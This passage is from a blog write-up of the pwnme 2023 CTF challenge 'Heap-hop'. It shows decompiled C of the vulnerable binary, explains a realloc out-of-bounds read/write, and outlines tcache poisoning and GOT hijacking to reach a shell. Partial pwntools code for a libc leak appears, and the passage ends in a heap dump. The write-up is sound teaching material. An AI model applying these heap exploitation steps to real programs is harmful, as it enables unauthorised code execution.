                    
                
            
        </entry>
    
        
        <entry>
            <title type="html"><![CDATA[[pwnme 2023 - pwn] Heap-hop]]></title>
            <link href="https://nasm.re/posts/heaphop/?utm_source=atom_feed" rel="alternate" type="text/html"  hreflang="en" />
            <id>https://nasm.re/posts/heaphop/</id>
            
            <published>2023-05-07T00:00:00+00:00</published>
            <updated>2023-05-07T00:00:00+00:00</updated>
            
            
            <content type="html"><![CDATA[<div class="gblog-post__anchorwrap">
    <h2 id="heap-hop">
        Heap-Hop
        <a data-clipboard-text="https://nasm.re/posts/heaphop/#heap-hop" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Heap-Hop" href="#heap-hop">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<blockquote>
<p>Solves: 31  Medium</p>
<p>Heap exploitation is cool, and the best is when no free is used. &gt;Try to pwn the challenge and get the flag remotely.</p>
<p><strong>Note</strong>:</p>
<ul>
<li><em>You must spawn an instance to solve this challenge. You can connect to it with netcat: nc IP PORT</em></li>
</ul>
<p>Author: Express#8049</p>
<p>Remote service at : nc 51.254.39.184 1336</p>
</blockquote>
<p>Heap-hop is a heap exploitation challenge I did during the <a
  class="gblog-markdown__link"
  href="https://pwnme.fr/"
  
  >pwnme CTF</a
>. It involved classic tricks like tcache poisoning and GOT hiijacking. You can find the related files <a
  class="gblog-markdown__link"
  href="https://github.com/ret2school/ctf/tree/master/2023/pwnme/pwn/heap"
  
  >here</a
>.</p>
<div class="gblog-post__anchorwrap">
    <h3 id="tldr">
        TL;DR
        <a data-clipboard-text="https://nasm.re/posts/heaphop/#tldr" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor TL;DR" href="#tldr">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h3>
</div>
<ul>
<li>Setup heap layout</li>
<li>fill tcachebin for 0x400 sized chunks</li>
<li>free large 0x400 sized chunk to get libc addresses</li>
<li>oob read onto the chunk right before the large freed chunk =&gt; libc leak</li>
<li>request a small 0x20 sized chunk that gets free right after, it falls at the begin of the chunk in the unsortedbin, oob read like just before =&gt; heap leak.</li>
<li>tcache poisoning (we&rsquo;re able to deal with safe-linking given we leaked heap)</li>
<li>With the help of tcache poisoning, overwrite <code>realloc@got</code> to write <code>&amp;system</code></li>
<li><code>realloc(&quot;/bin/sh&quot;)</code> is then <code>system(&quot;/binb/sh&quot;)</code></li>
</ul>
<div class="gblog-post__anchorwrap">
    <h2 id="what-we-have">
        What we have
        <a data-clipboard-text="https://nasm.re/posts/heaphop/#what-we-have" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor What we have" href="#what-we-have">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<pre tabindex="0"><code>$ checksec --file ./heap-hop
[*] '/media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ret2school/ctf/2023/pwnme/pwn/heap/heap-hop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
    RUNPATH:  b'/home/nasm/Documents/pwn/pwnme/heap'
$ ./libc.so.6 
GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.1) stable release version 2.35.
Copyright (C) 2022 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 11.2.0.
libc ABIs: UNIQUE IFUNC ABSOLUTE
For bug reporting instructions, please see:
&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.
</code></pre><p>What we can see is that a recent libc is provided (which means with safe-linking) and that the binary isn&rsquo;t PIE.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="code-review">
        Code review
        <a data-clipboard-text="https://nasm.re/posts/heaphop/#code-review" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Code review" href="#code-review">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Here is basically the main logic of the binary:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">input_int</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-4h]
</span><span class="c1"></span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[+] Welcome to hip-hop, you can create and listen to heap-hop music&#34;</span><span class="p">);</span>
  <span class="k">do</span>
  <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="s">&#34;Make your choice :</span><span class="se">\n\t</span><span class="s">- 1. Create a track.</span><span class="se">\n\t</span><span class="s">- 2. Read a track.</span><span class="se">\n\t</span><span class="s">- 3. Edit a track.</span><span class="se">\n</span><span class="s">&gt; &#34;</span><span class="p">);</span>
    <span class="n">input_int</span> <span class="o">=</span> <span class="n">read_input_int</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">input_int</span> <span class="o">==</span> <span class="mi">3</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">handle_edit</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="k">else</span>
    <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">input_int</span> <span class="o">&gt;</span> <span class="mi">3</span> <span class="p">)</span>
        <span class="k">goto</span> <span class="n">LABEL_10</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">input_int</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
      <span class="p">{</span>
        <span class="n">handle_create</span><span class="p">();</span>
        <span class="k">continue</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">input_int</span> <span class="o">==</span> <span class="mi">2</span> <span class="p">)</span>
        <span class="n">handle_read</span><span class="p">();</span>
      <span class="k">else</span>
<span class="nl">LABEL_10</span><span class="p">:</span>
        <span class="n">quit</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">while</span> <span class="p">(</span> <span class="n">quit</span> <span class="o">!=</span> <span class="mi">1</span> <span class="p">);</span>
  <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[?] Goodbye.&#34;</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>Basic layout for a heap exploitation challenge, we&rsquo;re allowed to create, read and edit a given track. As we already read in the initial statement we apparently cannot free a track.</p>
<p>Let&rsquo;s first take a look at the create function:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">handle_create</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">v0</span><span class="p">;</span> <span class="c1">// rdx
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">idx</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-14h] BYREF
</span><span class="c1"></span>  <span class="n">chunk_t</span> <span class="o">*</span><span class="n">buf</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-10h]
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]
</span><span class="c1"></span>
  <span class="n">v4</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter the tracklist ID</span><span class="se">\n</span><span class="s">&gt; &#34;</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">idx</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">idx</span> <span class="o">&gt;</span> <span class="mh">0x100</span> <span class="p">)</span>
    <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">tracks</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[!] track already exists.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">buf</span> <span class="o">=</span> <span class="p">(</span><span class="n">chunk_t</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x30uLL</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">buf</span> <span class="p">)</span>
      <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter the tracklist name</span><span class="se">\n</span><span class="s">&gt; &#34;</span><span class="p">);</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x20uLL</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter the tracklist content length</span><span class="se">\n</span><span class="s">&gt; &#34;</span><span class="p">);</span>
    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%ld&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">buf</span><span class="o">-&gt;</span><span class="n">size</span> <span class="o">&gt;</span> <span class="mh">0x480uLL</span> <span class="p">)</span>
      <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="n">v0</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">);</span>
    <span class="n">buf</span><span class="o">-&gt;</span><span class="n">track</span> <span class="o">=</span> <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="n">v0</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">track</span> <span class="p">)</span>
      <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter the tracklist content</span><span class="se">\n</span><span class="s">&gt; &#34;</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">track</span><span class="p">,</span> <span class="n">buf</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">)</span> <span class="p">)</span>
      <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="n">tracks</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[+] track successfully created.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">v4</span> <span class="o">-</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>It crafts a chunk, and then allocates a chunk for a given size (&lt; 0x480). The read function is very basic:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">handle_read</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-Ch] BYREF
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]
</span><span class="c1"></span>
  <span class="n">v2</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">v1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter the tracklist ID</span><span class="se">\n</span><span class="s">&gt; &#34;</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v1</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&gt;</span> <span class="mh">0x100</span> <span class="p">)</span>
    <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">tracks</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[+] track content :&#34;</span><span class="p">);</span>
    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">tracks</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">track</span><span class="p">,</span> <span class="n">tracks</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="o">&amp;</span><span class="n">byte_4020FF</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[!] track doesn&#39;t exist.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">v2</span> <span class="o">-</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>It prints <code>tracks[v1]-&gt;size</code> bytes from <code>tracks[v1]-&gt;track</code>. Which means no need to worry about badchars for the leak.</p>
<p>The bug lies in the <code>handle_edit</code> function:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">handle_edit</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">chunk_t</span> <span class="o">*</span><span class="n">v0</span><span class="p">;</span> <span class="c1">// rbx
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">idx</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-24h] BYREF
</span><span class="c1"></span>  <span class="n">size_t</span> <span class="n">size</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-20h] BYREF
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-18h]
</span><span class="c1"></span>
  <span class="n">v4</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">size</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter the tracklist ID</span><span class="se">\n</span><span class="s">&gt; &#34;</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">idx</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">idx</span> <span class="o">&gt;</span> <span class="mh">0x100</span> <span class="p">)</span>
    <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">tracks</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter the new tracklist content length</span><span class="se">\n</span><span class="s">&gt; &#34;</span><span class="p">);</span>
    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%ld&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">size</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">size</span> <span class="o">&gt;</span> <span class="mh">0x480</span> <span class="p">)</span>
      <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="n">v0</span> <span class="o">=</span> <span class="n">tracks</span><span class="p">[</span><span class="n">idx</span><span class="p">];</span>
    <span class="n">v0</span><span class="o">-&gt;</span><span class="n">track</span> <span class="o">=</span> <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="n">realloc</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">v0</span><span class="o">-&gt;</span><span class="n">track</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter the new tracklist content</span><span class="se">\n</span><span class="s">&gt; &#34;</span><span class="p">);</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">tracks</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">track</span><span class="p">,</span> <span class="n">tracks</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[+] track content edited.&#34;</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[!] track doesn&#39;t exist.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">v4</span> <span class="o">-</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>There are two bugs, or at least interesting behaviours around realloc. First there is an out of bound (oob) read / write, indeed if we give a size smaller than <code>tracks[idx]-&gt;size</code>, then <code>v0-&gt;track</code> could be changed to a smaller chunk and thus <code>read(0, (void *)tracks[idx]-&gt;track, tracks[idx]-&gt;size);</code> could write over the end of the chunk. Secondly we can free a chunk by giving zero to the size.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="exploitation">
        Exploitation
        <a data-clipboard-text="https://nasm.re/posts/heaphop/#exploitation" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Exploitation" href="#exploitation">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Given tcache poisoning seems to be pretty easy to achieve, we need to find where we could use our arbitrary write. If you remind well, the binary isn&rsquo;t PIE based and has only partial RELRO, which means we could easily hiijack the GOT entry of a function (like realloc) to replace it with system and then call <code>realloc(&quot;/bin/sh&quot;)</code>. This way we need to get a heap and a libc leak.</p>
<div class="gblog-post__anchorwrap">
    <h3 id="libc-leak">
        libc leak
        <a data-clipboard-text="https://nasm.re/posts/heaphop/#libc-leak" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor libc leak" href="#libc-leak">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h3>
</div>
<p>To get a libc leak we can fill the tcache and free a large chunk to make appear libc addresses on the heap and then read it through the oob read. Which gives:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">create</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;0&#34;</span><span class="p">)</span>

<span class="c1"># Step one, 7 chunks to fill tcache later</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
    <span class="n">create</span><span class="p">(</span><span class="mi">1</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

<span class="c1"># small chunk which will be used to the oob r/w</span>
<span class="n">create</span><span class="p">(</span><span class="mi">8</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;_&#34;</span><span class="p">)</span>
<span class="c1"># victim chunk</span>
<span class="n">create</span><span class="p">(</span><span class="mi">9</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;_&#34;</span><span class="p">)</span>

<span class="c1"># chunk with big size that will be used for the oob r/w</span>
<span class="n">create</span><span class="p">(</span><span class="mi">10</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;barreer&#34;</span><span class="p">)</span>
<span class="n">create</span><span class="p">(</span><span class="mi">10</span><span class="o">+</span><span class="mi">2</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;barree2&#34;</span><span class="p">)</span>

<span class="c1"># fill tcache</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
    <span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="o">+</span><span class="n">i</span><span class="p">)</span>

<span class="c1"># oob chunk </span>
<span class="n">free</span><span class="p">(</span><span class="mi">8</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>

<span class="n">free</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span> <span class="c1"># we free in order that at the next edit it actually allocates a new chunk</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;_&#34;</span><span class="p">)</span> <span class="c1"># allocated in 9</span>

<span class="n">free</span><span class="p">(</span><span class="mi">9</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># falls in the unsortedbin</span>

<span class="n">read</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span> <span class="c1"># oob read</span>
<span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mh">0x70</span><span class="p">)</span>
<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x219ce0</span>
</code></pre></div><p>The heap looks like this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">0x1d83120       0x0000000000000000      0x0000000000000041      ........A.......        &lt;<span class="o">=</span> chunk used to get the oob r/w
0x1d83130       0x000000000000000a      0x0000000000000000      ................                                                                               
0x1d83140       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83150       0x0000000000000020      0x0000000000000000       ...............
0x1d83160       0x0000000000000000      0x0000000000000031      ........1.......        &lt;<span class="o">=</span> track buffer of the chunk used to get the oob r/w
0x1d83170       0x0000000000000a5f      0x0000000000000000      _...............                                                                               
0x1d83180       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83190       0x0000000000000000      0x0000000000000041      ........A.......        &lt;<span class="o">=</span> victim chunk, size: 0x400, its track field is fell into the unsortedbin
0x1d831a0       0x000000000000000a      0x0000000000000000      ................                                                                               
0x1d831b0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d831c0       0x0000000000000400      0x0000000000000000      ................                                                                               
0x1d831d0       0x0000000000000000      0x0000000000000411      ................        &lt;-- unsortedbin<span class="o">[</span>all<span class="o">][</span>0<span class="o">]</span>                                                
0x1d831e0       0x00007f0eb218dce0      0x00007f0eb218dce0      ................                                                                               
0x1d831f0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83200       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83210       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83220       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83230       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83240       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83250       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83260       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83270       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83280       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83290       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d832a0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d832b0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d832c0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d832d0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d832e0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d832f0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83300       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83310       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83320       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83330       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83340       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83350       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83360       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83370       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83380       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83390       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d833a0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d833b0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d833c0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d833d0       0x0000000000000000      0x0000000000000000      ................
0x1d833e0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d833f0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83400       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83410       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83420       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83430       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83440       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83450       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83460       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83470       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83480       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83490       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d834a0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d834b0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d834c0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d834d0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d834e0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d834f0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83500       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83510       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83520       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83530       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83540       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83550       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83560       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83570       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83580       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83590       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d835a0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d835b0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d835c0       0x0000000000000000      0x0000000000000000      ................                                                                               
